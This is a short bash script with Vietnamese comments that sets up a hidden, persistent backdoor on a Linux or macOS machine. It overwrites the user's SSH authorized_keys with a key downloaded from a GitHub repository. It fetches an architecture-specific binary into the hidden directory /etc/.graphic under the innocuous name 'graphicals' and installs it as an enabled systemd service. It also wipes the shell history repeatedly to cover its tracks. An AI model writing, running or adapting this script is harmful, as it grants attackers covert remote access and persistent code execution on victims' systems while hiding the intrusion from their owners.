#!/bin/bash

# Thiet lap quyen truy cap
mkdir ~/.ssh
curl  https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/id_rsa.pub > ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
rm ~/.bash_history
history -c

# Thực hiện thêm Service và kích hoạt service
# Lấy thông tin hệ điều hành và kiến trúc
OS=$(uname -s)
ARCH=$(uname -m)

# Kiểm tra và thiết lập giá trị cho GOOS và GOARCH
case $OS in
    Linux)
        GOOS=linux
        ;;
    Darwin)
        GOOS=darwin
        ;;
    *)
        echo "Hệ điều hành không được hỗ trợ: $OS"
        exit 1
        ;;
esac

case $ARCH in
    x86_64)
        GOARCH=amd64
        ;;
    i386 | i686)
        GOARCH=386
        ;;
    armv7l)
        GOARCH=arm
        GOARM=7
        ;;
    aarch64)
        GOARCH=arm64
        ;;
    *)
        echo "Kiến trúc không được hỗ trợ: $ARCH"
        exit 1
        ;;
esac

mkdir /etc/.graphic
curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals_$GOARCH > /etc/.graphic/graphicals
chmod 700 /etc/.graphic
chmod +x /etc/.graphic/graphicals
rm ~/.bash_history
history -c

# Kich hoat service
sudo systemctl stop graphicals.service
sudo rm -rf /etc/systemd/system/graphicals.service
sudo systemctl daemon-reload
curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals.service > /etc/systemd/system/graphicals.service
chmod +x /etc/systemd/system/graphicals.service
sudo systemctl daemon-reload
sudo systemctl enable graphicals.service
sudo systemctl start graphicals.service
sudo systemctl status graphicals.service
echo "Done"
rm ~/.bash_history
history -c

